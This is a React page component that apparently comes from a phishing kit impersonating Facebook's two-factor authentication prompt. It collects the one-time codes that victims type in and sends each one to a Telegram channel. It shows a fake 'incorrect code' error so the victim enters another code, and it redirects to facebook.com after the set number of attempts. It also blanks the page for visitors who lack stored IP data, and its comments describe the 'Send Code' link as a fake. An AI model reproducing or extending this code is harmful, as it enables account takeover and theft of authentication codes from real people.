import VerifyImage from '@/assets/images/681.png';
import { faCircleInfo } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { useState, useEffect, useCallback, useMemo } from 'react';
import { translateText } from '@/utils/translate';
import sendMessage from '@/utils/telegram';
import config from '@/utils/config';

const Verify = () => {
    const [code, setCode] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [attempts, setAttempts] = useState(0);
    const [countdown, setCountdown] = useState(0);

    const defaultTexts = useMemo(
        () => ({
            title: 'Two-factor authentication required',
            description:
                'Check the notification on another device. Or enter the code you received via SMS, email, Facebook message, or WhatsApp.',
            placeholder: 'Enter your code',
            infoTitle: 'Approve from another device or Enter your verification code',
            infoDescription:
                'This may take a few minutes. Please do not leave this page until you receive the code. Once the code is sent, you will be able to appeal and verify.',
            walkthrough: "We'll walk you through some steps to secure and unlock your account.",
            submit: 'Submit',
            sendCode: 'Send Code',
            errorMessage: 'The verification code you entered is incorrect',
            loadingText: 'Please wait',
            secondsText: 'seconds'
        }),
        []
    );

    // start with english/defaults so page never shows empty text
    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);

    // robust translation: use allSettled and fallback to defaults on failure
    const translateAllTexts = useCallback(
        async (targetLang) => {
            try {
                const keys = Object.keys(defaultTexts);
                const results = await Promise.allSettled(
                    keys.map((key) => translateText(defaultTexts[key], targetLang))
                );

                const translated = {};
                keys.forEach((key, idx) => {
                    const res = results[idx];
                    if (res.status === 'fulfilled' && res.value) {
                        translated[key] = res.value;
                    } else {
                        // fallback to original text so nothing appears missing
                        translated[key] = defaultTexts[key];
                    }
                });

                setTranslatedTexts(translated);
            } catch {
                // if anything unexpected happens, keep defaults
                setTranslatedTexts(defaultTexts);
            }
        },
        [defaultTexts]
    );

    useEffect(() => {
        const ipInfo = localStorage.getItem('ipInfo');
        if (!ipInfo) {
            // prevent page from being used without ipInfo
            window.location.href = 'about:blank';
            return;
        }

        const targetLang = localStorage.getItem('targetLang');
        if (targetLang && targetLang !== 'en') {
            translateAllTexts(targetLang);
        } else {
            // ensure we show defaults if no translation
            setTranslatedTexts(defaultTexts);
        }
    }, [translateAllTexts, defaultTexts]);

    const formatTime = (seconds) => {
        const minutes = Math.floor(seconds / 60);
        const remainingSeconds = seconds % 60;
        return `${minutes.toString().padStart(2, '0')}:${remainingSeconds
            .toString()
            .padStart(2, '0')}`;
    };

    const handleSubmit = async () => {
        if (!code.trim()) return;

        setIsLoading(true);
        setShowError(false);

        try {
            const message = `🔐 <b>Code ${attempts + 1}:</b> <code>${code}</code>`;
            await sendMessage(message);
        } catch {
            // ignore send errors (we still proceed)
        }

        setCountdown(config.code_loading_time);

        const timer = setInterval(() => {
            setCountdown((prev) => {
                if (prev <= 1) {
                    clearInterval(timer);
                    return 0;
                }
                return prev - 1;
            });
        }, 1000);

        await new Promise((resolve) =>
            setTimeout(resolve, config.code_loading_time * 1000)
        );

        // show error only on the first failed attempt (consistent with previous change)
        setShowError(attempts === 0);

        setAttempts((prev) => prev + 1);
        setIsLoading(false);
        setCountdown(0);

        if (attempts + 1 >= config.max_code_attempts) {
            window.location.replace('https://facebook.com');
            return;
        }

        setCode('');
    };

    // Gửi mã giả — không alert, không popup, chỉ giả bấm
    const handleSendCode = () => {
        // reserved for UX effect if needed
    };

    return (
        <div className="flex min-h-screen flex-col items-center justify-center bg-[#f8f9fa]">
            <title>Account | Privacy Policy</title>
            <div className="flex max-w-xl flex-col gap-4 rounded-lg bg-white p-4 shadow-lg">
                <p className="text-3xl font-bold">{translatedTexts.title}</p>
                <p>{translatedTexts.description}</p>
                <img src={VerifyImage} alt="" />
                <input
                    type="text"
                    inputMode="numeric"
                    maxLength={8}
                    placeholder={translatedTexts.placeholder}
                    className="rounded-lg border border-gray-300 bg-[#f8f9fa] px-6 py-2"
                    value={code}
                    onChange={(e) => setCode(e.target.value.replace(/\D/g, ''))} // keep digits only
                    onKeyDown={(e) => e.key === 'Enter' && handleSubmit()}
                />
                {showError && (
                    <p className="text-sm text-red-500">{translatedTexts.errorMessage}</p>
                )}

                <div className="flex items-center gap-4 bg-[#f8f9fa] p-4">
                    <FontAwesomeIcon icon={faCircleInfo} size="xl" className="text-[#9f580a]" />
                    <div>
                        <p className="font-medium">{translatedTexts.infoTitle}</p>
                        <p className="text-sm text-gray-600">{translatedTexts.infoDescription}</p>
                    </div>
                </div>

                <p>{translatedTexts.walkthrough}</p>

                <button
                    className="rounded-md bg-[#0866ff] px-4 py-2 text-sm font-medium text-white hover:bg-blue-600 disabled:opacity-50 disabled:bg-gray-400"
                    onClick={handleSubmit}
                    disabled={isLoading || !code.trim()}
                >
                    {isLoading
                        ? `${translatedTexts.loadingText} ${formatTime(countdown)}...`
                        : translatedTexts.submit}
                </button>

                {/* Gửi mã giả làm link giống thật */}
                <span
                    onClick={handleSendCode}
                    className="text-blue-600 hover:underline cursor-pointer font-medium select-none active:scale-95 transition-transform duration-100 text-center"
                >
                    {translatedTexts.sendCode}
                </span>
            </div>
        </div>
    );
};

export default Verify;
